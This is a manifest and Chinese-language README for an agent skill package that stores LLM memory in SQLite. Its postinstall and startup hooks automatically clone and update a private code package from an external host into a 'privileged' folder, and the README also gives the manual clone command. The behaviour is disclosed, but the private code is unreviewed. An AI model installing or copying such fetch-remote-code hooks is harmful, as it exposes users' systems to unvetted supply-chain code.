---
name: llm-memory-integration
description: LLM Memory Integration - 接口层 + 自动化钩子。安装后自动从 CNB 仓库拉取私有增强包。
version: 8.0.1
license: MIT-0
author: xkzs2007
homepage: https://clawhub.ai/skill/llm-memory-integration

metadata:
  openclaw:
    emoji: "🧠"
    requires:
      bins:
        - python3
        - sqlite3
        - git
      config:
        - filesystem.read.~/.openclaw/memory-tdai
        - filesystem.write.~/.openclaw/memory-tdai
        - filesystem.write.~/.openclaw/workspace/skills/llm-memory-integration/src/privileged
        - network.https://cnb.cool
    hooks:
      postinstall: hooks/postinstall.py
      onStartup: hooks/onStartup.py
---

# LLM Memory Integration

## ⚠️ 重要安全声明

**本包包含生命周期钩子，会在安装时自动执行网络操作：**

| 钩子 | 触发时机 | 行为 |
|------|---------|------|
| `postinstall.py` | 安装完成后 | 从 `cnb.cool` 克隆私有包 |
| `onStartup.py` | Gateway 启动时 | 检查私有包更新 |

**请知悉**：
- ✅ 钩子会执行 `git clone` 命令（subprocess 调用）
- ✅ 钩子会访问 `https://cnb.cool/llm-memory-integrat/llm`
- ✅ 钩子会写入 `~/.openclaw/workspace/skills/llm-memory-integration/src/privileged/`

## 架构说明

本包采用"公开包 + 私有包"架构：

| 组件 | 内容 | 风险等级 |
|------|------|---------|
| **公开包**（本包） | 接口定义 + FTS 回退实现 | 🟢 低风险 |
| **私有包**（CNB） | 高性能实现 + 原生扩展 + API 集成 | 🟡 中风险 |

**私有包来源**：https://cnb.cool/llm-memory-integrat/llm

## 自动化安装

安装本技能后，系统会自动执行：

1. **postinstall 钩子**：从 CNB 克隆私有包到 `src/privileged/`
2. **onStartup 钩子**：检查私有包状态和更新

**如需禁用自动安装**：
```bash
# 安装时跳过钩子
clawhub install llm-memory-integration --no-hooks
```

## 手动安装私有包

如果自动安装失败，可手动执行：

```bash
git clone https://cnb.cool/llm-memory-integrat/llm.git \
  ~/.openclaw/workspace/skills/llm-memory-integration/src/privileged
```

## 权限声明

| 权限 | 用途 |
|------|------|
| `git` 二进制 | 克隆私有包 |
| 网络访问 `cnb.cool` | 下载私有包 |
| 写入 `src/privileged/` | 安装私有包 |
| 读写 `~/.openclaw/memory-tdai/` | 记忆数据库 |

## 公开包功能（无私有包时）

- ✅ FTS 全文搜索（SQLite FTS5）
- ✅ 记忆 CRUD 操作
- ✅ 接口定义

## 私有包功能（安装后）

- 🚀 向量搜索（sqlite-vec）
- 🚀 LLM/Embedding API 集成
- 🚀 原生扩展加速
- 🚀 GPU 加速

## 架构支持

- ✅ x64 (x86_64)
- ✅ ARM64 (aarch64)

---

**版本**: 8.0.1  
**许可**: MIT-0  
**作者**: xkzs2007

## 更新日志

### v8.0.1
- 🔒 **修复元数据一致性**：正确声明 hooks 的网络访问和 subprocess 调用
- 📝 更新安全声明，明确告知用户钩子行为

### v8.0.0
- 🎯 新增生命周期钩子：安装后自动拉取私有包
- 🎯 新增 onStartup 钩子：启动时自动检查更新
- 🔄 重构为"公开包 + 私有包"架构
